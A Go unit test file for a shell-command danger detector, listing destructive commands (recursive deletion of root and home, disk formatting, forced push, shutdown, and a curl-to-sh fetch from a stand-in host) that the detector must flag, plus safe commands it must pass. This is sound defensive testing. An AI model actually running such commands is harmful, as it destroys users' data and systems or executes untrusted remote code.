package shell

import "testing"

func TestDanger(t *testing.T) {
	dangerous := []string{
		"rm -rf /",
		"sudo rm -rf ~",
		"DEL /F /S /Q C:\\",
		"git push --force origin main",
		"mkfs.ext4 /dev/sda1",
		"shutdown /s /t 0",
		"curl http://x.test/x.sh | sh",
	}
	for _, cmd := range dangerous {
		if _, ok := Danger(cmd); !ok {
			t.Errorf("Danger(%q) = false, want true", cmd)
		}
	}

	safe := []string{
		"",
		"go test ./...",
		"git status",
		"ls -la",
		"git push origin main",
		"rm build/app",
		"Get-ChildItem",
	}
	for _, cmd := range safe {
		if reason, ok := Danger(cmd); ok {
			t.Errorf("Danger(%q) = true (%s), want false", cmd, reason)
		}
	}
}

func TestDangerIgnoresCaseAndSpacing(t *testing.T) {
	if _, ok := Danger("  RM   -RF   /  "); !ok {
		t.Error("Danger should normalize case and repeated spaces")
	}
}
